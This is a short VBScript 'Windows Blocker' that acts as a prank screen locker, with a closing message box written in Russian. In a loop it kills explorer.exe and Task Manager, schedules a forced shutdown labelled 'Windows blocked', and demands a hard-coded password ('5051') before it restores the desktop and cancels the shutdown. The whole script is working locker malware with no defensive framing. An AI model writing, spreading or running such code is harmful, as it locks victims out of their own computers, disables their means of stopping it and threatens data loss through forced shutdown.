Do
set t=createobject("Wscript.Shell")
set kill = createobject("wscript.shell")
kill.run"taskkill /f /im explorer.exe"
kill.run"taskkill /f /im taskmgr.exe"
t.run"shutdown -t 3600 -s -c Windows blocked"
password = InputBox ("Windows Blocker, enter password")
Loop Until password = "5051"
msgbox"veselo.pravda?",16,"Molodes)"
t.run"explorer"
t.run"shutdown -a"